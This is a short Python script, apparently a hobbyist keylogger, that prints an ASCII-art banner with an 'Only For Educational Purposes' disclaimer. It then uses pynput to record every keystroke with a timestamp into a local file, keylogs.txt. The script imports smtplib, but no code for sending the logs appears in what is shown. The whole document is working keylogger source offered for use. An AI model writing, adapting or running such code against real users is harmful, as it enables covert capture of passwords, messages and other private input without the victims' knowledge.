from pynput.keyboard import Key, Listener
import logging
import smtplib
print("""

██╗░░██╗███████╗██╗░░░██╗██╗░░░░░██╗░██████╗████████╗███████╗███╗░░██╗███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██║██╔════╝╚══██╔══╝██╔════╝████╗░██║██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║╚█████╗░░░░██║░░░█████╗░░██╔██╗██║█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░╚═══██╗░░░██║░░░██╔══╝░░██║╚████║██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░███████╗██║██████╔╝░░░██║░░░███████╗██║░╚███║███████╗██║░░██║
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝

█▄▄ █▄█   █░░ █░█ █▀█ █▀▄▀█ ▄▀█ █▄░█ ▄▀█ █▀ █░█ █ █▄▀ █░█ █▄▄ █░█
█▄█ ░█░   █▄▄ █▄█ ▀▀█ █░▀░█ █▀█ █░▀█ █▀█ ▄█ █▀█ █ █░█ ▀▀█ █▄█ ▀▀█

*Only For Educational Purposes

╭━━━╮╭╮╱╱╱╱╱╭╮╱╱╱╱╱╭╮
┃╭━╮┣╯╰╮╱╱╱╭╯╰╮╱╱╱╱┃┃
┃╰━━╋╮╭╋━━┳┻╮╭╋━━┳━╯┃
╰━━╮┃┃┃┃╭╮┃╭┫┃┃┃━┫╭╮┃  
┃╰━╯┃┃╰┫╭╮┃┃┃╰┫┃━┫╰╯┃
╰━━━╯╰━┻╯╰┻╯╰━┻━━┻━━╯

""")



log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='"Results: "%(asctime)s: %(message)s')





def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press)as listener:
    listener.join()




